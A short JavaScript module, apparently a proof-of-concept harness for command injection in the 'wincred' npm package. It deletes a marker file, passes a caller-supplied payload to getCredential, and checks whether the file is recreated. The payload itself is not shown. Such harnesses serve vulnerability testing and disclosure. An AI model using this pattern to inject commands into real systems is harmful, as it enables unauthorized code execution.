function exploitFunction(payload) {
  const wincred = require("wincred");
  const fs = require("fs");
  const path = "./wincred";

  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
      console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }

  let file_exist = fs.existsSync(path);
  if (!file_exist) {
    wincred.getCredential(payload).then(() => {
      file_exist = fs.existsSync(path);
      if (file_exist) {
        console.log("File created:", path);
      } else {
        console.error("Failed to create file:", path);
      }
    }).catch(error => {
      console.error("Error creating file:", error);
    });
  }
}

module.exports = { exploitFunction };